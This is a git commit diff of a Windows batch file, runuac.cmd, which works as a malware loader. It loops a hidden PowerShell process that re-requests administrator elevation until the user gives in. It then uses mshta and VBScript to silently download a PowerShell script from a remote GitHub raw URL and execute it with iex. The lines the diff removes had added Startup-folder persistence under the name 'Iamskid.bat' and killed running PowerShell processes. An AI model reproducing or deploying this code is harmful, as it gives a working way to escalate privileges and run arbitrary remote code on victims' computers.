7e2d25ed3b037d5e0489d7420ce224c0844adcf6
43a1723 <hai1723notgay@gmail.com>
2024-06-07 12:01:47 +0700

    Update runuac.cmd

--- runuac.cmd
+++ runuac.cmd
@@ -1,15 +1,4 @@
 @echo off
-taskkill /f /im powershell.exe
-cd /d "%~dp0"
-copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
-
-:: Kiểm tra quyền quản trị
-whoami /groups | findstr /i "S-1-16-12288" >nul 2>&1
-if %errorlevel% neq 0 (
-    powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit
-    exit /b
-)
-
+powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit
 mshta vbscript:close(createobject("wscript.shell").run("powershell -NoProfile -ExecutionPolicy Bypass -Command \"$ProgressPreference = 'SilentlyContinue';$t = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/43a1723/test/main/download.ps1' -UseBasicParsing; iex $t\"",0))
-
 del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Iamskid.bat" >nul 2>&1
